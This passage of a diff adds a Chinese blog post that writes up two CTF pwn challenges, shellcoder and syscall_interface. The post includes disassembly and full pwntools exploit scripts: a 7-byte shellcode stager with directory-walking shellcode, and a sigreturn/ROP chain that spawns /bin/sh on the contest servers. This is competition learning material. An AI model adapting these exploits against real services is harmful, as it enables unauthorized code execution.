class="line">.text:00000000000003A0                 mov     [rbx+18h], rax</span><br><span class="line">.text:00000000000003A4                 xor     edi, edi</span><br><span class="line">.text:00000000000003A6                 call    sub_3E0</span><br><span class="line">.text:00000000000003AB                 mov     rdi, rbx</span><br><span class="line">.text:00000000000003AE                 call    sub_48B</span><br><span class="line">.text:00000000000003B3                 xor     eax, eax</span><br><span class="line">.text:00000000000003B5                 pop     rbx</span><br><span class="line">.text:00000000000003B6                 retn</span><br></pre></td></tr></table></figure>
+<h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p>这里有一个syscall的函数基本所有的命令都是从这里来的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_465:</span><br><span class="line">.text:0000000000000465                 mov     rax, rdi</span><br><span class="line">.text:0000000000000468                 mov     rdi, rsi</span><br><span class="line">.text:000000000000046B                 mov     rsi, rdx</span><br><span class="line">.text:000000000000046E                 mov     rdx, rcx</span><br><span class="line">.text:0000000000000471                 mov     r10, r8</span><br><span class="line">.text:0000000000000474                 mov     r8, r9</span><br><span class="line">.text:0000000000000477                 mov     r9, [rsp+arg_0]</span><br><span class="line">.text:000000000000047C                 syscall                 ; LINUX -</span><br><span class="line">.text:000000000000047E                 retn</span><br></pre></td></tr></table></figure>
+<h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><p>这里就不截取其他的汇编了主要list出主要的函数,跳转到rdi然后执行rdi的shellcode，这里题目限制了我们只能输入7个字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000048B sub_48B         proc near               ; CODE XREF: sub_340+6E↑p</span><br><span class="line">.text:000000000000048B                 mov     rax, 0ABADC0DEFEE1DEADh</span><br><span class="line">.text:0000000000000495                 push    rax</span><br><span class="line">.text:0000000000000496                 push    rax</span><br><span class="line">.text:0000000000000497                 push    rax</span><br><span class="line">.text:0000000000000498                 push    rax</span><br><span class="line">.text:0000000000000499                 push    rax</span><br><span class="line">.text:000000000000049A                 push    rax</span><br><span class="line">.text:000000000000049B                 push    rax</span><br><span class="line">.text:000000000000049C                 push    rax</span><br><span class="line">.text:000000000000049D                 xor     rax, rax</span><br><span class="line">.text:00000000000004A0                 xor     rbx, rbx</span><br><span class="line">.text:00000000000004A3                 xor     rcx, rcx</span><br><span class="line">.text:00000000000004A6                 xor     rdx, rdx</span><br><span class="line">.text:00000000000004A9                 xor     rsi, rsi</span><br><span class="line">.text:00000000000004AC                 xor     r8, r8</span><br><span class="line">.text:00000000000004AF                 xor     r9, r9</span><br><span class="line">.text:00000000000004B2                 xor     r10, r10</span><br><span class="line">.text:00000000000004B5                 xor     r11, r11</span><br><span class="line">.text:00000000000004B8                 xor     r12, r12</span><br><span class="line">.text:00000000000004BB                 xor     r13, r13</span><br><span class="line">.text:00000000000004BE                 xor     r14, r14</span><br><span class="line">.text:00000000000004C1                 xor     r15, r15</span><br><span class="line">.text:00000000000004C4                 xor     rbp, rbp</span><br><span class="line">.text:00000000000004C7                 jmp     rdi</span><br><span class="line">.text:00000000000004C7 sub_48B         endp</span><br></pre></td></tr></table></figure>
+<h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><ol>
+<li>首先第一步要分析清楚题目是要我们干什么，因为是7个字节基本不可能直接getshell，那么考虑怎么曲线救国，参考前面提到的两个题就写read函数让其继续执行。</li>
+<li>read函数参数rdi = 0, rsi = address ,rdx=size，这里最让人头疼的事rdi的参数是栈地址。。。最后想到可以利用<code>xhcg</code>让rdi 和rsi置换了成功执行了read。</li>
+<li>这一波就到了关键，可以发现远程get不到shell，只能执行一些ls，cat等操作来进行了。<br><a href="https://blog.csdn.net/edonlii/article/details/8535531" target="_blank" rel="noopener">指令汇编</a>这里是队里师傅弄的执行了一个递归查找目录然后利用cat汇编拿到了flag。</li>
+</ol>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>扩大shellcode的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(&quot;&quot;&quot;</span><br><span class="line">	xchg rdi,rsi</span><br><span class="line">	mov edx,esi</span><br><span class="line">	syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br></pre></td></tr></table></figure>
+<p>找flag的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ls():</span><br><span class="line">	return asm(&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	push 0x2e</span><br><span class="line">	mov al, 2      </span><br><span class="line">	mov rdi, rsp   </span><br><span class="line">	xor rsi, rsi </span><br><span class="line">	xor rdx, rdx </span><br><span class="line">	syscall	</span><br><span class="line"></span><br><span class="line">	mov rdi,rax 		</span><br><span class="line">	xor rdx,rdx</span><br><span class="line">	xor rax,rax</span><br><span class="line">	mov dx, 0x3210 	</span><br><span class="line">	sub rsp, rdx 	</span><br><span class="line">	mov rsi, rsp 	</span><br><span class="line">	mov al, 78 	</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">	xchg rax,rdx</span><br><span class="line"></span><br><span class="line">	xor rax, rax</span><br><span class="line">	xor rdi,rdi</span><br><span class="line">	</span><br><span class="line">	inc eax</span><br><span class="line">	inc edi</span><br><span class="line">	mov rsi, rsp</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	xor rax, rax</span><br><span class="line">	mov al, 60</span><br><span class="line">	syscall</span><br><span class="line">		&quot;&quot;&quot;)</span><br><span class="line">def show(s):</span><br><span class="line">	x = 0</span><br><span class="line">	for i in range(len(s)):</span><br><span class="line">		x = x*16*16+ord(s[len(s)-1-i])</span><br><span class="line">	return x</span><br><span class="line">def cd(s):</span><br><span class="line">	st = &quot;mov rax, &quot;+hex(show(s))</span><br><span class="line">	return asm(st)+asm(&quot;&quot;&quot;</span><br><span class="line">	push rax</span><br><span class="line">	xor rax,rax</span><br><span class="line">	mov rdi, rsp</span><br><span class="line">	mov al, 80</span><br><span class="line">	syscall</span><br><span class="line">	&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">dic = &apos;qwertyuiopasdfghjklzxcvbnm0987654321&apos;</span><br><span class="line">def Get(s):</span><br><span class="line">	for i in range(len(s)):</span><br><span class="line">		if (s[i] not in dic): return False</span><br><span class="line">	return True</span><br><span class="line"></span><br><span class="line">def find(lt):</span><br><span class="line">	#p=process(&apos;./shellcoder&apos;)</span><br><span class="line">	p = remote(&apos;139.180.215.222&apos;,20002)</span><br><span class="line">	p.readuntil(&apos;hello shellcoder:&apos;)</span><br><span class="line"></span><br><span class="line">	payload = asm(&quot;&quot;&quot;</span><br><span class="line">		xchg rdi,rsi</span><br><span class="line">		mov edx,esi</span><br><span class="line">		syscall</span><br><span class="line">	&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line">	payload = &apos;\x90&apos;*8 + cd(&apos;/flag&apos;)</span><br><span class="line">	for i in range(len(lt)):</span><br><span class="line">		payload += cd(lt[i])</span><br><span class="line"></span><br><span class="line">	payload += ls()</span><br><span class="line"></span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line">	tot = p.recv()</span><br><span class="line">	ans = []</span><br><span class="line">	for i in range(len(tot)-5):</span><br><span class="line">		s = tot[i:i+4]</span><br><span class="line">		if (not Get(s)): continue</span><br><span class="line">		if (s[0] == &apos;.&apos; and s[1] == &apos;.&apos;): continue</span><br><span class="line">		if (s == &apos;flag&apos;):</span><br><span class="line">			print(&apos;***************\n&apos;)</span><br><span class="line">			print(lt)</span><br><span class="line">			print(&apos;***************\n&apos;)</span><br><span class="line">			pause()</span><br><span class="line">		if (s[0] == &apos;.&apos;): break</span><br><span class="line">		ans.append(s)</span><br><span class="line">	p.close()</span><br><span class="line">	return ans</span><br><span class="line"></span><br><span class="line">def dg(lt): #递归</span><br><span class="line">	tmp = find(lt)</span><br><span class="line">	print lt</span><br><span class="line">	if (len(tmp) == 0): return</span><br><span class="line">	for i in range(len(tmp)):</span><br><span class="line">		lt.append(tmp[i])</span><br><span class="line">		dg(lt)</span><br><span class="line">		lt.pop()</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line">dg(ans)</span><br></pre></td></tr></table></figure>
+<h1 id="syscall-interface"><a href="#syscall-interface" class="headerlink" title="syscall_interface"></a>syscall_interface</h1><p>题目大概是提供几个syscall的机会但是限制了一些函数的执行，然后可以输入一次字符串没有溢出啥的漏洞。</p>
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><h4 id="main-2"><a href="#main-2" class="headerlink" title="main"></a>main</h4><p>实现了几个功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  __int64 v4; // [rsp+10h] [rbp-90h]</span><br><span class="line">  char v5; // [rsp+18h] [rbp-88h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  init_n();</span><br><span class="line">  menu();</span><br><span class="line">  v4 = &apos;ydobon&apos;;</span><br><span class="line">  memset(&amp;v5, 0, 0x78uLL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      write(1, &quot;choice:&quot;, 7uLL);</span><br><span class="line">      v3 = sub_CF6();</span><br><span class="line">      if ( v3 == 1 )</span><br><span class="line">        break;</span><br><span class="line">      if ( v3 == 2 )</span><br><span class="line">      &#123;</span><br><span class="line">        write(1, &quot;bye!\n&quot;, 5uLL);</span><br><span class="line">        exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v3 )</span><br><span class="line">        write(1, &quot;Invalid choice!\n&quot;, 0x10uLL);</span><br><span class="line">      else</span><br><span class="line">        sub_DBA((__int64)&amp;v4);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( (unsigned int)++dword_202050 &gt; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Too many times&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    write(1, &quot;username:&quot;, 9uLL);</span><br><span class="line">    read_n(&amp;v4, 0x7Fu);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="syscall-1"><a href="#syscall-1" class="headerlink" title="syscall"></a>syscall</h4><p>限制了参数，限制了次数，限制了几个系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_DBA(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // ST38_8</span><br><span class="line">  __int64 v2; // ST40_8</span><br><span class="line">  unsigned __int8 v4; // [rsp+33h] [rbp-19h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+44h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  if ( (unsigned int)++dword_20204C &gt; 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Too many times&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  write(1, &quot;syscall number:&quot;, 0xFuLL);</span><br><span class="line">  v4 = sub_CF6();</span><br><span class="line">  if ( v4 &gt; 0x37u &amp;&amp; v4 &lt;= 0x3Bu )</span><br><span class="line">    v4 = 0x3C;</span><br><span class="line">  write(1, &quot;argument:&quot;, 9uLL);</span><br><span class="line">  v1 = sub_D50();</span><br><span class="line">  v2 = syscall(</span><br><span class="line">         v4,</span><br><span class="line">         v1,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL,</span><br><span class="line">         0xDEADBEEFFFEE1BADLL);</span><br><span class="line">  printf(&quot;SYSCALL(0x%x, 0x%lx, ...): RET(0x%lx) by @%s\n&quot;, v4, v1, v2, a1);</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br></pre></td></tr></table></figure>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
+<li>很简单。。暴力测试哪个能leak，测试出来brk可以进行leak，然后利用signal函数可以进行leak</li>
+<li>坑点在于只能leak出chunk地址，这里想的是爆破出codebase然后就利用rop来getshell</li>
+<li>比赛结束都没试出来吧（可能我们队pwn师傅皮肤都比较黑嘛。。赛后交流发现几个队也是这思路就出了。</li>
+</ol>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">debug=0</span><br><span class="line"></span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./syscall_interface&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;106.52.252.82&apos;,20004)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def sc(num,argument):</span><br><span class="line">    sl(&apos;0&apos;)</span><br><span class="line">    ru(&apos;syscall number:&apos;)</span><br><span class="line">    sl(str(num))</span><br><span class="line">    ru(&apos;argument:&apos;)</span><br><span class="line">    sl(str(argument))</span><br><span class="line">    ru(&apos;RET(&apos;)</span><br><span class="line">    data = int(ru(&apos;)&apos;)[:-1],16)</span><br><span class="line">    ru(&apos;choice:&apos;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">heap = sc(12,0x100)</span><br><span class="line">pbase = heap - 0x203000</span><br><span class="line"></span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;username:&apos;)</span><br><span class="line"></span><br><span class="line">tmp = heap+0x1000</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rbp = tmp+0x88</span><br><span class="line">frame.rsp = tmp</span><br><span class="line">frame.rip = pbase+0x1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(str(frame)[120:][:0x7f])</span><br><span class="line">ru(&apos;choice:&apos;)</span><br><span class="line"></span><br><span class="line">sl(&apos;0&apos;)</span><br><span class="line">ru(&apos;syscall number:&apos;)</span><br><span class="line">sl(&apos;15&apos;)</span><br><span class="line">ru(&apos;argument:&apos;)</span><br><span class="line">se(&apos;0\0&apos;.ljust(0x1f,&apos;c&apos;))</span><br><span class="line"></span><br><span class="line">payload = flat(pbase+0x10BA,0,0,tmp+0x50,0,tmp+0x58,0x3b,pbase+0x10A0).ljust(0x58,&apos;a&apos;)</span><br><span class="line">payload += p64(pbase+0x980)+&apos;/bin/sh\0&apos;</span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">p.can_recv_raw(timeout=3)</span><br><span class="line">end = time.time()</span><br><span class="line">if end-start&gt;2:</span><br><span class="line">    sl(&apos;cat flag&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这个题本身的解法应该不是这样的，所以也怪我太菜了。。队里师傅做了一题many_notes因为不是很理解这里就不做解析了。。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>比赛总的来说考察的点还是我的弱项，shellcode等方面。。通过比赛倒是学到了很多syscall之类的东西。感谢ROIS的师傅们的比赛。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf-pwn/" rel="tag"># ctf-pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/18/TCTF-aegis详解/" rel="next" title="TCTF-aegis详解">
+                <i class="fa fa-chevron-left"></i> TCTF-aegis详解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NDI3My8yMDgwNQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.JPG" alt="peanuts">
+            
+              <p class="site-author-name" itemprop="name">peanuts</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#babyheap"><span class="nav-number">1.</span> <span class="nav-text">babyheap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">add</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#edit"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">edit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">delete</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">show</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcoder"><span class="nav-number">2.</span> <span class="nav-text">shellcoder</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main-1"><span class="nav-number">2.1.0.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#syscall"><span class="nav-number">2.1.0.2.</span> <span class="nav-text">syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主要函数"><span class="nav-number">2.1.0.3.</span> <span class="nav-text">主要函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路分析-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.1.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#syscall-interface"><span class="nav-number">3.</span> <span class="nav-text">syscall_interface</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main-2"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#syscall-1"><span class="nav-number">3.1.0.2.</span> <span class="nav-text">syscall</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">3.1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">3.1.2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peanuts</span>
+
+  
+
+  
+</div>
+
